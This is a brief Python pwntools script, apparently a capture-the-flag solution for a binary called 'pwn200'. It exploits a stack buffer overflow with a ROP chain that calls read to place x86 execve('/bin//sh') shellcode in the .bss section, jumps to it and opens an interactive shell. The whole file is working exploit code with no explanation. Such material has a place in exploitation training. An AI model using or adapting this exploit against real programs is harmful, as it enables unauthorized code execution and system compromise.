from pwn import *

p = process("./pwn200")

popret = 0x8048331
pop3ret = 0x8048599
pop4ret = 0x8048598
pop2ret = 0x804859a
read_plt = 0x08048350
bss = 0x0804A034

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


payload ="a"*(0x18+4)
payload+=p32(read_plt)
payload+=p32(pop3ret)
payload+=p32(0)
payload+=p32(bss)
payload+=p32(len(shellcode))
payload+=p32(bss)

print p.recv()
p.sendline(payload)
p.send(shellcode)
p.interactive()
